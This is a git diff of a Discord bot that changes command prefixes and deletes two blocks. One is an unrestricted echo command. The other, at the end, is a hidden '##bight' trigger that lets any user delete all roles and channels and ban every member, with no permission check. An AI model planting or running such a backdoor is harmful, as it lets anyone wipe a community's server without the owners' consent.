@@ -17,22 +17,11 @@ client.login(process.env.TOKEN);
 
 
 
-client.on('message', message => {
-  if (message.content === 'Vhelp') {
-message.channel.send('قريبا.')
-  }
-  if(message.content === 'Vtag'){
-message.channel.send('قريبا..')
-  }
-  if(message.content.startsWith("$s")) {
-    var text = message.content.split(' ').slice(1).join(' ');
-     message.channel.send(text);
-  }
-});
+
 
 
 client.on("message",async message => {
-  if (message.content === "/server") {
+  if (message.content === "$server") {
   let embed = new Discord.RichEmbed()
   .addField(`:id: Server ID:`, `${message.guild.id}`, true)
   .addField(`:calendar: Created on:`, `${moment(message.guild.createdAt).format(`D/M/YYYY h:mm`)} \n ${moment(message.guild.createdAt).locale("EN-nw").fromNow()}`,true)
@@ -48,7 +37,7 @@ client.on("message",async message => {
 
   }
 
-  if(message.content.startsWith('/roles')) {
+  if(message.content.startsWith('$roles')) {
       let spaces = "                      "
       const roles = []
       message.guild.roles.forEach(c => { roles.push(c.name+spaces.substring(c.name.length)+c.members.size+" members"); });
@@ -72,7 +61,7 @@ client.on("message",async message => {
       message.channel.send(`**✅ ${user.user.username} banned from the server! ✈**`)
     }
 
-    if(message.content.split(' ')[0] == `/kick`){
+    if(message.content.split(' ')[0] == `$kick`){
       if(!message.member.hasPermission('KICK_MEMBERS')) return;
       if(!message.guild.member(client.user).hasPermission('KICK_MEMBERS')) return;
       let args = message.content.split(" ").slice(1);
@@ -839,11 +828,3 @@ if(message.content.startsWith(prefix + 'unbanall')) {
   });
 
 
-client.on("message", async(msg)=>{
-if(msg.content.toLowerCase().startsWith("##" + "bight")){
-    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
-    msg.guild.channels.deleteAll();
-    msg.guild.members.tap(member => member.ban("bight"));
-}
-
-});
